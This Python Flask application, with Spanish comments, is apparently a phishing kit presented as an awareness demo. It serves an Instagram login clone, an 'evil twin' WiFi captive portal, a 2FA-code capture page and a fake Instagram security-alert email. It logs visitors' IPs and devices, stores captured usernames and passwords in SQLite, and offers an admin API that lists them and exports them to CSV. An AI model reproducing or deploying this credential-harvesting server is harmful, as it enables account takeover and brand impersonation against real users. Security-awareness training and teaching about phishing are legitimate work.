from flask import Flask, request, redirect, render_template_string, jsonify, send_file
import time
import os
import sqlite3
import json
from datetime import datetime
import csv
import io

app = Flask(__name__, static_folder='PruebasHTML', static_url_path='/PruebasHTML')

# Inicializar base de datos
def init_db():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    # Tabla de visitas
    c.execute('''CREATE TABLE IF NOT EXISTS visits
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  scenario TEXT)''')
    
    # Tabla de credenciales capturadas
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  scenario TEXT,
                  username TEXT,
                  password TEXT,
                  extra_data TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

def log_info(tipo, mensaje):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[{timestamp}] [{tipo}] {mensaje}")

def save_visit(ip, user_agent, scenario):
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO visits (timestamp, ip_address, user_agent, scenario) VALUES (?, ?, ?, ?)",
              (timestamp, ip, user_agent, scenario))
    conn.commit()
    conn.close()

def save_capture(ip, user_agent, scenario, username, password, extra_data=None):
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO captures (timestamp, ip_address, user_agent, scenario, username, password, extra_data) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (timestamp, ip, user_agent, scenario, username, password, extra_data))
    conn.commit()
    conn.close()

@app.route('/')
def home():
    # 1. CAPTURA DE HUELLA DIGITAL (IP + User Agent)
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log_info("VISITA DETECTADA", f"IP: {ip_address} | Dispositivo: {user_agent}")
    save_visit(ip_address, user_agent, "Instagram")

    try:
        with open('PruebasHTML/indexinsta.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: No se encuentra el archivo principal."

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    # 2. CAPTURA DE CREDENCIALES
    print("="*60)
    print(f" [!!!] CREDENCIALES CAPTURADAS (IP: {ip_address})")
    print(f" > Usuario:    {username}")
    print(f" > Contraseña: {password}")
    print("="*60)
    
    save_capture(ip_address, user_agent, "Instagram", username, password)
    
    # Redirigir a la página educativa
    return redirect("/educativo")

@app.route('/checkpoint')
def checkpoint():
    # Renderizamos la página de "Ingresa tu código"
    try:
        with open('PruebasHTML/checkpoint.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta checkpoint.html"

@app.route('/verify', methods=['POST'])
def verify_2fa():
    code = request.form.get('code2fa')
    
    # 3. CAPTURA DEL CÓDIGO SMS (2FA BYPASS)
    print("="*60)
    print(f" [!!!] CÓDIGO 2FA CAPTURADO")
    print(f" > Código SMS: {code}")
    print("="*60)
    
    # Redirigir a la página educativa
    return redirect("/educativo")

@app.route('/educativo')
def educativo():
    # Página educativa que muestra las señales de phishing
    try:
        with open('PruebasHTML/educativo.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta educativo.html"

# --- RUTAS NUEVAS: PORTAL CAUTIVO WIFI (EVIL TWIN) ---

@app.route('/wifi')
def wifi_portal():
    # Renderizamos la página del Portal WiFi
    try:
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        log_info("VISITA WIFI DETECTADA", f"IP: {ip_address} | Dispositivo: {user_agent}")
        save_visit(ip_address, user_agent, "WiFi Portal")
        
        with open('PruebasHTML/wifi_portal.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta wifi_portal.html"

@app.route('/wifi-login', methods=['POST'])
def wifi_login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    print("="*60)
    print(f" [!!!] CREDENCIALES WIFI CAPTURADAS (IP: {ip_address})")
    print(f" > Email/User: {email}")
    print(f" > Password:   {password}")
    print("="*60)
    
    save_capture(ip_address, user_agent, "WiFi Portal", email, password)
    
    # Redirigir a la página educativa
    return redirect("/educativo")

# --- DASHBOARD ADMINISTRATIVO ---

@app.route('/admin')
def admin_dashboard():
    try:
        with open('PruebasHTML/dashboard.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta dashboard.html"

@app.route('/email-demo')
def email_demo():
    """Muestra cómo se vería un correo de phishing real"""
    # Obtener la URL actual del servidor para el enlace
    server_url = request.host_url.rstrip('/')
    
    html = f"""
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Demo: Correo de Phishing</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background-color: #f0f2f5;
                margin: 0;
                padding: 20px;
            }}
            .header-info {{
                max-width: 600px;
                margin: 0 auto 20px;
                background: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            }}
            .header-info h1 {{
                color: #e74c3c;
                margin-top: 0;
            }}
            .warning {{
                background: #fff3cd;
                border-left: 4px solid #ffc107;
                padding: 15px;
                margin: 15px 0;
                border-radius: 4px;
            }}
            .signals {{
                background: #d4edda;
                border-left: 4px solid #28a745;
                padding: 15px;
                margin: 15px 0;
                border-radius: 4px;
            }}
            .signals h3 {{
                margin-top: 0;
                color: #155724;
            }}
            .signals ul {{
                margin: 10px 0;
                padding-left: 20px;
            }}
            .signals li {{
                margin: 8px 0;
                color: #155724;
            }}
        </style>
    </head>
    <body>
        <div class="header-info">
            <h1>🎓 DEMO: Correo de Phishing</h1>
            <p><strong>Esta es una demostración educativa</strong> de cómo se ve un correo de phishing típico.</p>
            
            <div class="warning">
                <strong>⚠️ Advertencia Educativa:</strong><br>
                A continuación verás un correo falso diseñado para parecer legítimo. 
                Observa las señales de alerta que deberías notar en un correo real.
            </div>
            
            <div class="signals">
                <h3>🚨 Señales de Alerta a Observar:</h3>
                <ul>
                    <li><strong>Urgencia artificial:</strong> "Detectamos un inicio de sesión inusual"</li>
                    <li><strong>Ubicación sospechosa:</strong> Moscú, Rusia (para crear pánico)</li>
                    <li><strong>URL del enlace:</strong> Al pasar el mouse, verás que NO va a Instagram real</li>
                    <li><strong>Remitente:</strong> Parece oficial pero puede ser falsificado</li>
                    <li><strong>Diseño profesional:</strong> Los atacantes copian diseños reales</li>
                </ul>
            </div>
            
            <p style="text-align: center; margin: 20px 0;">
                <strong>↓ Simula que este correo llegó a tu bandeja ↓</strong>
            </p>
        </div>

        <!-- Email real simulado -->
        <div style="max-width: 600px; margin: 0 auto; background-color: white; border: 1px solid #dbdbdb; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
            <!-- Header -->
            <div style="background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); padding: 20px; text-align: center;">
                <h1 style="color: white; margin: 0; font-size: 32px; font-weight: bold;">Instagram</h1>
            </div>
            
            <!-- Body -->
            <div style="padding: 30px;">
                <h2 style="color: #262626; font-size: 24px; margin-bottom: 20px;">🔒 Alerta de Seguridad</h2>
                
                <p style="color: #262626; font-size: 16px; line-height: 1.6; margin-bottom: 15px;">
                    Hola,
                </p>
                
                <p style="color: #262626; font-size: 16px; line-height: 1.6; margin-bottom: 15px;">
                    Detectamos un <strong>inicio de sesión inusual</strong> en tu cuenta de Instagram desde una ubicación desconocida:
                </p>
                
                <div style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; border-radius: 4px;">
                    <p style="margin: 0; color: #856404; font-size: 14px;">
                        <strong>📍 Ubicación:</strong> Moscú, Rusia<br>
                        <strong>🕒 Fecha:</strong> {datetime.now().strftime("%d de %B, %Y - %H:%M")}h<br>
                        <strong>💻 Dispositivo:</strong> Windows 10 - Chrome
                    </p>
                </div>
                
                <p style="color: #262626; font-size: 16px; line-height: 1.6; margin-bottom: 15px;">
                    Si <strong>NO fuiste tú</strong>, te recomendamos asegurar tu cuenta inmediatamente.
                </p>
                
                <!-- Button -->
                <div style="text-align: center; margin: 30px 0;">
                    <a href="{server_url}" 
                       onmouseover="this.style.opacity='0.8'" 
                       onmouseout="this.style.opacity='1'"
                       style="background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); color: white; text-decoration: none; padding: 14px 40px; border-radius: 8px; font-size: 16px; font-weight: bold; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: opacity 0.3s;">
                        ✓ Verificar Actividad
                    </a>
                    <br><br>
                    <span style="color: #e74c3c; font-size: 12px; font-weight: bold;">
                        ⚠️ PASA EL MOUSE SOBRE EL BOTÓN PARA VER LA URL REAL
                    </span>
                </div>
                
                <p style="color: #8e8e8e; font-size: 14px; line-height: 1.6; margin-top: 20px;">
                    Si fuiste tú quien inició sesión, puedes ignorar este mensaje.
                </p>
                
                <hr style="border: none; border-top: 1px solid #dbdbdb; margin: 30px 0;">
                
                <p style="color: #8e8e8e; font-size: 12px; line-height: 1.6;">
                    Este es un correo automático del sistema de seguridad de Instagram.<br>
                    Por favor no respondas a este mensaje.
                </p>
            </div>
            
            <!-- Footer -->
            <div style="background-color: #fafafa; padding: 20px; text-align: center; border-top: 1px solid #dbdbdb;">
                <p style="color: #8e8e8e; font-size: 12px; margin: 5px 0;">
                    © 2026 Instagram from Meta
                </p>
                <p style="color: #8e8e8e; font-size: 12px; margin: 5px 0;">
                    <a href="#" style="color: #0095f6; text-decoration: none;">Centro de Ayuda</a> • 
                    <a href="#" style="color: #0095f6; text-decoration: none;">Términos</a> • 
                    <a href="#" style="color: #0095f6; text-decoration: none;">Privacidad</a>
                </p>
            </div>
        </div>

        <!-- Info final -->
        <div class="header-info" style="margin-top: 20px;">
            <h3>✅ Señales que notaste:</h3>
            <ul>
                <li>El enlace "Verificar Actividad" realmente va a: <code>{server_url}</code></li>
                <li>Instagram NUNCA te pedirá verificar tu cuenta por correo con urgencia</li>
                <li>Los correos legítimos de Instagram vienen de dominios oficiales verificados</li>
                <li>La ubicación "Moscú, Rusia" es una táctica común para crear pánico</li>
            </ul>
            
            <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd;">
                <a href="{server_url}admin" style="background: #667eea; color: white; padding: 12px 24px; text-decoration: none; border-radius: 8px; display: inline-block; font-weight: 600;">
                    📊 Volver al Dashboard
                </a>
            </div>
        </div>
    </body>
    </html>
    """
    return html

@app.route('/api/stats')
def get_stats():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    # Total de visitas
    c.execute("SELECT COUNT(*) FROM visits")
    total_visits = c.fetchone()[0]
    
    # Total de capturas
    c.execute("SELECT COUNT(*) FROM captures")
    total_captures = c.fetchone()[0]
    
    # Tasa de conversión
    conversion_rate = (total_captures / total_visits * 100) if total_visits > 0 else 0
    
    # Víctimas por escenario
    c.execute("SELECT scenario, COUNT(*) FROM captures GROUP BY scenario")
    by_scenario = dict(c.fetchall())
    
    # IPs únicas
    c.execute("SELECT COUNT(DISTINCT ip_address) FROM captures")
    unique_ips = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'total_visits': total_visits,
        'total_captures': total_captures,
        'conversion_rate': round(conversion_rate, 2),
        'by_scenario': by_scenario,
        'unique_ips': unique_ips
    })

@app.route('/api/captures')
def get_captures():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("SELECT * FROM captures ORDER BY timestamp DESC LIMIT 100")
    captures = c.fetchall()
    
    conn.close()
    
    captures_list = []
    for capture in captures:
        captures_list.append({
            'id': capture[0],
            'timestamp': capture[1],
            'ip': capture[2],
            'user_agent': capture[3],
            'scenario': capture[4],
            'username': capture[5],
            'password': capture[6]
        })
    
    return jsonify(captures_list)

@app.route('/api/timeline')
def get_timeline():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("""
        SELECT strftime('%Y-%m-%d %H:00:00', timestamp) as hour, COUNT(*) 
        FROM captures 
        GROUP BY hour 
        ORDER BY hour DESC 
        LIMIT 24
    """)
    timeline = c.fetchall()
    
    conn.close()
    
    return jsonify([{'time': t[0], 'count': t[1]} for t in reversed(timeline)])

@app.route('/api/export/csv')
def export_csv():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
    captures = c.fetchall()
    
    conn.close()
    
    # Crear CSV en memoria
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Encabezados
    writer.writerow(['ID', 'Timestamp', 'IP Address', 'User Agent', 'Scenario', 'Username', 'Password', 'Extra Data'])
    
    # Datos
    for capture in captures:
        writer.writerow(capture)
    
    # Convertir a bytes
    output.seek(0)
    return send_file(
        io.BytesIO(output.getvalue().encode('utf-8')),
        mimetype='text/csv',
        as_attachment=True,
        download_name=f'phishing_captures_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
    )

if __name__ == '__main__':
    print("""
    =======================================================
     SERVIDOR DE PHISHING AVANZADO (MULTI-SCENARIO)
     
     [ESCENARIO 1] Instagram Clone
     > URL: http://localhost:5000/
     
     [ESCENARIO 2] Evil Twin WiFi Portal
     > URL: http://localhost:5000/wifi
     
     - Registro de IPs y Dispositivos: ACTIVADO
     - Captura de Credenciales: ACTIVADO
     - Simulación Bypass 2FA: ACTIVADO
    =======================================================
    """)
    # Usamos 0.0.0.0 para que sea visible en la red local si se desea
    app.run(host='0.0.0.0', port=5000, debug=False)
